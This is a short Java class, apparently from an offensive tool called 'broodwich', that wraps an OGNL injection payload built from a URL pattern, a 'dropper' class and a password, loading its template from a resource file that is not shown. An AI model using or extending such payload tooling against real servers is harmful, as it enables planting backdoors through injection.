package party.itistimeto.broodwich.payloads;

import java.io.IOException;
import java.net.URISyntaxException;
import java.security.NoSuchAlgorithmException;
import java.text.MessageFormat;

public class OGNLPayload extends JavascriptPayload {
    public OGNLPayload(String urlPattern, Class dropperClass, String password) throws NoSuchAlgorithmException, IOException, URISyntaxException {
        super(urlPattern, dropperClass, password);
    }

    @Override
    public String toString() {
        try {
            return AbstractPayload.getResourceText("OGNLPayloadTemplate.ognl");
        } catch (URISyntaxException | IOException e) {
            return e.getMessage(); // don't @ me
        }
    }
}
